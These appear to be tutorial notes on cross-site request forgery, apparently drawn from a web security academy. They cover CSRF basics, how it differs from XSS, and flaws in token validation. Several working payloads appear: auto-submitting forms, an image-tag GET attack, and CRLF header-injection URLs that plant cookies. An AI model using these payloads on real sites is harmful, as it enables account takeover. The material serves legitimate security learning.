# 1. The basic

## 1.1 - What is CSRF?

Cross-site request forgery (CSRF) is a web vulnerability where attackers trick users into performing unintended actions by bypassing the same origin policy that normally prevents websites from interfering with each other.

**What is the impact of a CSRF attack?**
CSRF attacks cause users to unknowingly perform actions like changing passwords, email addresses, or transferring funds. This can lead to full account compromise, and if the victim has privileged access, attackers may gain control over the entire application.

**How does CSRF work?**

CSRF attacks require three conditions:

* **A relevant action** - Something valuable to exploit, like changing permissions or passwords
* **Cookie-based session handling** - The app uses only session cookies for authentication with no additional validation
* **Predictable request parameters** - All required parameters can be determined or guessed by the attacker

**CSRF Example**

Consider an email change function:
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
email=wiener@normal-user.com
```

This is CSRF-vulnerable because:
* Changing email enables account takeover via password reset
* Only session cookies authenticate the request
* The email parameter is predictable

**The Attack:**
The attacker creates a malicious page:
```html
<form action="https://vulnerable-website.com/email/change" method="POST">
  <input type="hidden" name="email" value="pwned@evil-user.net" />
</form>
<script>document.forms[0].submit();</script>
```

When a logged-in victim visits this page, their browser automatically submits the form with their session cookie, changing their email to the attacker's address.

**How to deliver a CSRF exploit**

CSRF delivery methods mirror reflected XSS attacks:

**Standard delivery:**
* Host malicious HTML on attacker-controlled website
* Lure victims via email, social media, or embedded content
* Wait for logged-in users to visit the malicious page

**Self-contained attacks (GET-based):**
For simple GET requests, no external site is needed. The attack can be a direct URL:
```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

This image tag automatically triggers the request when loaded, making it perfect for embedding in emails, forums, or any content the victim might view while logged into the target site.

## 1.3 - XSS vs CSRF

**What is the difference between XSS and CSRF?**

**Cross-Site Scripting (XSS):** Executes arbitrary JavaScript in the victim's browser

**Cross-Site Request Forgery (CSRF):** Forces victims to perform unintended actions

**Key differences:**

**Scope:**
* **XSS** - Can exploit any functionality the user has access to
* **CSRF** - Usually limited to specific unprotected actions

**Communication:**
* **XSS** - "Two-way" - can send requests AND read responses, enabling data theft
* **CSRF** - "One-way" - can trigger requests but cannot see the responses

**Impact:** XSS is generally more severe due to its broader scope and ability to steal data, while CSRF is typically limited to specific state-changing actions.

**Can CSRF tokens prevent XSS attacks?**

Yes, CSRF tokens can prevent some XSS attacks, particularly reflected XSS.

**Example without CSRF protection:**
```
https://insecure-website.com/status?message=<script>/*Bad stuff*/</script>
```

**With CSRF token:**
```
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*Bad stuff*/</script>
```

**Why it works:** Reflected XSS relies on cross-site requests (hence "cross-site" scripting). Since attackers can't forge valid CSRF tokens from external sites, they can't craft malicious URLs that victims' browsers will accept.

**Important limitation:** This only protects against reflected XSS via GET requests. It doesn't prevent stored XSS or DOM-based XSS, where the malicious script is already within the application's trusted context.

**Important Caveats:**

**Limited Protection Scope:**
* CSRF tokens only protect specific endpoints - if reflected XSS exists elsewhere on the site without CSRF protection, it remains exploitable

**XSS Bypasses CSRF:**
* Any XSS vulnerability can defeat CSRF protection by using JavaScript to fetch valid tokens first, then perform protected actions
* The malicious script runs in the trusted context and can access CSRF tokens normally

**No Protection Against Stored XSS:**
* CSRF tokens don't prevent stored XSS attacks
* If a CSRF-protected page displays stored XSS content, the malicious script executes when users visit the page, regardless of CSRF protection

**Bottom Line:** CSRF tokens provide limited XSS protection only for reflected XSS on specific endpoints. They're not a comprehensive XSS defense and can be bypassed by any existing XSS vulnerability on the site.

# 2. Bypassing CSRF token validation

## 2.1 - What is a CSRF token?

A CSRF token is a unique, secret, and unpredictable value generated by the server and shared with the client. For sensitive actions like form submissions, the client must include the correct CSRF token, or the server will reject the request.

This prevents CSRF attacks because external attackers cannot guess or obtain the valid token needed to forge requests.

A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:

```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

Submitting this form results in the following request:

```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

When implemented correctly, CSRF tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of the victim. As the attacker has no way of predicting the correct value for the CSRF token, they won't be able to include it in the malicious request.

**Note:**
> - CSRF tokens don't have to be sent as hidden parameters in a POST request. Some applications place CSRF tokens in HTTP headers, for example. The way in which tokens are transmitted has a significant impact on the security of a mechanism as a whole.

## 2.2 - Common flaws in CSRF token validation

### Validation of CSRF token depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

```
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@anything">
</form>
<script>
        document.forms[0].submit();
</script>
```

### Validation of CSRF token depends on token being present

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

### CSRF token is not tied to the user session

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

**Note:**
> - We can check this by using 2 accounts: A and B.
> - On attemp of changing email of A, 2 parameter being used: `sessionID: abc` and `csrf token: xyz`.
> - But instead, we drop our `POST` request which contain `csrf token` and use that token for acount B.
> - If the request get accepted --> Vuln

### CSRF token is tied to a non-session cookie

In this variation, applications tie CSRF tokens to a cookie, but not the session cookie—often occurring when session handling and CSRF protection use separate frameworks.

This is harder to exploit but remains vulnerable if attackers can set cookies in the victim's browser. The attacker obtains a valid token and cookie from their own account, plants their cookie in the victim's browser through cookie-setting behavior, then uses their token in the CSRF attack.

**Note:**
> - To test for this variation, we can use 2 accounts: A and B.
> - We'll attempt to change the email of 2 accounts.
> - Assuming the  request would contains this: `Cookie: session=abc... csrfKey=qwe... <SNIP> email=abc.com&csrfToken=mnb...`.
> - If we replace `csrfKey` and `csrfToken` of A with B, and the request get accepted by Website, this mean csrf token and key is not tied to `session cookie`.
> - It would resolve to vuln if we can some how `inject cookie header to the website`.

**Assuming the search function is vuln to code injection:**

`/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`

**The we'll make CSRF POC with this alter:**

`<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`

`%3b%20SameSite=None` mean `; SameSite=None`. It is an encoded string that sets a cookie with the `SameSite=None` attribute, allowing it to be included in **cross-origin** requests.

### CSRF token is simply duplicated in a cookie

In another variation, applications use "double submit" defense—duplicating the same token in both a cookie and request parameter, then simply verifying they match. This avoids server-side token storage.

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

This remains vulnerable if the site has cookie-setting functionality. The attacker doesn't need a valid token—they can invent one, plant it as a cookie in the victim's browser, then submit the same invented token in their CSRF attack.

**Note:**
> - Test this by changing both `csrf` value. If the request get accepted, then it is vuln `IF` you can `inject` cookie to the website.
> - `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`
> - `<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
